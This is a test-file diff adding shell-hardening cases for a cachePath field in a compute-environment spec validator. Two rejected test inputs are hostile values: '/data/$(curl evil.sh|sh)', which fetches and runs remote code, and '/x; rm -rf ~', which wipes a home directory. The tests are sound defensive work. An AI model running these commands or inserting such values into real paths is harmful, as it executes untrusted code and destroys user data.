@@ -146,6 +146,48 @@ describe('ComputeEnvironmentSpecSchema', () => {
   })
 })
 
+describe('ComputeEnvironmentSpecSchema — cachePath shell hardening', () => {
+  it('rejects a cache path carrying a command substitution', () => {
+    // cachePath reaches rendered shell text through the weight-bearing provisioning witness. Defence
+    // in depth: even if a future caller forgets to quote it, the value must never carry `$(...)`.
+    const result = validateEnvironmentSpec({
+      runtime: 'conda',
+      cachePath: '/data/$(curl evil.sh|sh)'
+    })
+    expect(result.ok).toBe(false)
+  })
+
+  it('accepts the cache paths real clusters use', () => {
+    // Guard against over-tightening: these are the shapes seen on Lustre/GPFS/scratch filesystems.
+    // A regression that rejects any of them breaks legitimate provisioning.
+    const legitimate = [
+      '/scratch/proj-01/.cache/hf',
+      '/lustre/home/user/envs',
+      '/gpfs/data/lab_name/models/v2.1',
+      '~/.cache/huggingface',
+      '/mnt/shared/Model Cache/torch',
+      '/work/group+shared/cache=v1',
+      '/scratch/user_01/.conda/pkgs'
+    ]
+    for (const cachePath of legitimate) {
+      const result = validateEnvironmentSpec({ runtime: 'conda', cachePath })
+      expect(result.ok, cachePath).toBe(true)
+    }
+  })
+
+  it('reports a rejected cache path through the structured spec error channel', () => {
+    // ComputeEnvironmentSpecSchema is a frozen shape: a rejection must travel the existing
+    // invalid_environment_spec channel with a named field, never as a thrown exception.
+    const result = validateEnvironmentSpec({ runtime: 'conda', cachePath: '/x; rm -rf ~' })
+    expect(result.ok).toBe(false)
+    if (result.ok) throw new Error('expected rejection')
+    expect(result.error.error_code).toBe('invalid_environment_spec')
+    expect(result.error.field).toBe('cachePath')
+    expect(result.error.message).toContain('shell metacharacters')
+    expect(result.error.retry_after_user_action).toBe(false)
+  })
+})
+
 describe('renderEnvironmentPreamble — conda', () => {
   it('emits a deterministic activation line', () => {
     const preamble = renderEnvironmentPreamble({
